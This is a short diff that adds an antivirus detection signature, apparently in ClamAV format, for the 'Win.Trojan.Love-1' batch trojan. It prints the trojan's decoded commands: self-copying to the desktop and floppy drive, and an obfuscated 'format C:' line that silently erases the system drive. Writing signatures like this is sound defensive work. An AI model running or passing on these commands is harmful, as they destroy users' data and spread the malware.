@@ -1,0 +1,9 @@
+VIRUS NAME: Win.Trojan.Love-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+copy %0 %windir%\dektop\love.bat
+copy %0 A:\*.bat
+set as=rm
+set ff=test
+fo%as%at C: /u /q /aut
